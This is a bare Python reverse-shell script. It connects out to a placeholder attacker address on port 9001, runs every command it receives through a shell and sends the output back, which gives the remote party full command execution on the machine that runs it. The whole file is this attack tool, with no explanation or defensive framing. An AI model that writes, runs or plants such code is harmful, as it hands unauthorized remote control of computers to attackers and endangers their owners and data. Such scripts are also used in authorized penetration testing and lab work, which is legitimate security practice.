#!/usr/bin/env python3
import socket
import subprocess

HOST = '<IP Address'
PORT = 9001

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

try:
    while True:
        cmd = s.recv(1024).decode().strip()
        if cmd.lower() == "exit":
            break
        try:
            proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            out, err = proc.communicate()
            output = out + err
            s.send(output if output else b"")
        except Exception as e:
            s.send(f"Error: {e}\n".encode())
except KeyboardInterrupt:
    pass
finally:
    s.close()
